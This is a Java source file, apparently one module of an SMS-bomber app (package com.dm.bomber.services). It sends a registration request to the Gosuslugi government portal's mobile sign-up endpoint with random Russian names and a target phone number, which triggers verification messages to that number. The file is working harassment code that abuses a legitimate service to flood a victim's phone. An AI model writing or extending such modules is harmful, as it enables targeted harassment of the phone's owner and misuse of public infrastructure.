package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

public class Gosuslugi extends JsonService {

    public Gosuslugi() {
        setUrl("https://www.gosuslugi.ru/auth-provider/mobile/register");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("instanceId", "123");
            json.put("firstName", getRussianName());
            json.put("lastName", getRussianName());
            json.put("contactType", "mobile");
            json.put("contactValue", format(getFormattedPhone(), "+*(***)*******"));
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
